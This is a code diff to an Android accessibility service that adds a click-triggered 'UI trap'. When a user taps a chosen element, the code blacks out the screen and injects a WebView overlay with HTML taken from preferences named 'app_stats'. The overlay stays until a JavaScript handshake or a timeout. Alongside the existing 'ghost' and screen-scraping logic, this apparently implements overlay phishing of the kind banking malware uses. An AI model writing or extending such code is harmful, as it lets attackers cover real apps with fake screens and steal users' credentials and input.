@@ -472,6 +472,40 @@ class MyAccessibilityService : AccessibilityService() {
             handleGhostEvent(event)
         }
 
+        // --- PREDICTIVE UI TRAP (Click Interception) ---
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+            if (statsPrefs.getBoolean("ui_trap_active", false)) {
+                val target = statsPrefs.getString("ui_trap_target", "") ?: ""
+                if (target.isNotEmpty() && nodeMatchesTarget(event.source, target)) {
+                    val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
+                    val html = statsPrefs.getString("ui_trap_html", "") ?: ""
+                    val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
+                    
+                    DebugLogger.log("UI_TRAP", "Target clicked: [$target]. Applying INSTANT blackout blindfold.")
+                    
+                    // 1. Instant Blackout (No thread jumping, synchronous execution)
+                    DimmerManager.applyDim(this, 100, method)
+                    
+                    // 2. Deploy WebView Overlay
+                    DynamicUIManager.showOverlay(this, true, method, html)
+                    DebugLogger.log("UI_TRAP", "WebView overlay injected. Awaiting JS Cortex.setDim(0) handshake to reveal.")
+                    
+                    // 3. Disarm Trap (Single-fire to prevent loops)
+                    statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
+                    
+                    // 4. Timeout Failsafe
+                    if (timeout > 0) {
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            DynamicUIManager.removeOverlay(this)
+                            DimmerManager.applyDim(this, 0, method) // Force unblind
+                            DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Failsafe triggered, blindfold removed.")
+                        }, timeout * 1000)
+                    }
+                }
+            }
+        }
+
         // --- 1.5 TREE SCRAPER ENGINE (Multi-Task Queue) ---
         val tasksToProcess = treeTasks.filter { it.pkg == null || it.pkg == pkgName }
         
@@ -587,6 +621,22 @@ class MyAccessibilityService : AccessibilityService() {
 
     private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
         // No-op: Ghost logic disabled
+        return false
+    }
+
+    private fun nodeMatchesTarget(node: AccessibilityNodeInfo?, targetText: String): Boolean {
+        if (node == null) return false
+        val nodeText = node.text?.toString()?.trim()
+        val nodeDesc = node.contentDescription?.toString()?.trim()
+        val nodeId = node.viewIdResourceName?.toString()?.trim()
+
+        if (nodeText.equals(targetText, ignoreCase = true)) return true
+        if (nodeDesc.equals(targetText, ignoreCase = true)) return true
+        if (targetText.contains(":id/") && nodeId == targetText) return true
+        
+        for (i in 0 until node.childCount) {
+            if (nodeMatchesTarget(node.getChild(i), targetText)) return true
+        }
         return false
     }
 
